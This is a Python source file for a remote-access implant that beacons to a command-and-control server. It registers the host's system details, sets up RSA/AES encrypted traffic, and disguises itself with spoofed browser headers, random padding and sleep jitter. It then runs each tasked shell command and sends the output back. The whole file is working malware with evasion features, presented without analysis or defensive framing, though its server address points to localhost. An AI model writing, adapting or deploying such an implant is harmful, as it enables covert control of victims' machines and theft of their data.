import requests
import platform
import socket
import os
import time
import random
import base64
import subprocess
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes

C2 = "http://127.0.0.1:8000"
AGENT_FILE = ".agent"

# -------------------------
# Fake browser headers
# -------------------------
HEADERS = {
    "User-Agent": random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64)"
    ]),
    "Accept": "application/json",
    "Connection": "keep-alive"
}

# -------------------------
# System Info
# -------------------------
def get_system_info():
    return {
        "hostname": socket.gethostname(),
        "username": platform.node(),
        "os": platform.system(),
        "ip": socket.gethostbyname(socket.gethostname())
    }


# -------------------------
# Get server RSA key
# -------------------------
def get_server_key():
    r = requests.get(f"{C2}/pubkey", headers=HEADERS)
    return RSA.import_key(r.json()["key"])


# -------------------------
# Generate AES session key
# -------------------------
AES_KEY = get_random_bytes(32)


# -------------------------
# Encrypt AES key with RSA
# -------------------------
def encrypt_session_key(pubkey):
    cipher = PKCS1_OAEP.new(pubkey)
    encrypted = cipher.encrypt(AES_KEY)
    return base64.b64encode(encrypted).decode()


# -------------------------
# AES Encrypt
# -------------------------
def encrypt(data):
    iv = get_random_bytes(16)
    cipher = AES.new(AES_KEY, AES.MODE_CFB, iv=iv)

    # padding to randomize size
    padding = os.urandom(random.randint(5, 25)).hex()
    payload = data + "|" + padding

    encrypted = iv + cipher.encrypt(payload.encode())
    return base64.b64encode(encrypted).decode()


# -------------------------
# AES Decrypt
# -------------------------
def decrypt(data):
    raw = base64.b64decode(data)
    iv = raw[:16]
    ciphertext = raw[16:]

    cipher = AES.new(AES_KEY, AES.MODE_CFB, iv=iv)
    result = cipher.decrypt(ciphertext).decode()

    return result.split("|")[0]


# -------------------------
# Register
# -------------------------
def register():
    pubkey = get_server_key()

    payload = {
        "key": encrypt_session_key(pubkey),
        "info": get_system_info()
    }

    r = requests.post(f"{C2}/register", json=payload, headers=HEADERS)
    return r.json()["agent_id"]


# -------------------------
# Sleep jitter
# -------------------------
def jitter_sleep():
    base = 10
    jitter = random.uniform(-3, 3)
    time.sleep(base + jitter)


# -------------------------
# Execute command
# -------------------------
def run(cmd):
    try:
        return subprocess.check_output(cmd, shell=True).decode()
    except Exception as e:
        return str(e)


# -------------------------
# Beacon
# -------------------------
AGENT_ID = register()
print("[+] Agent:", AGENT_ID)

while True:
    try:
        payload = {
            "data": encrypt("beacon")
        }

        r = requests.post(
            f"{C2}/beacon/{AGENT_ID}",
            json=payload,
            headers=HEADERS
        )

        task = r.json().get("task")

        if task:
            cmd = decrypt(task)
            print("[+] Task:", cmd)

            result = run(cmd)

            requests.post(
                f"{C2}/result/{AGENT_ID}",
                json={"data": encrypt(result)},
                headers=HEADERS
            )

    except Exception as e:
        print("error:", e)

    jitter_sleep()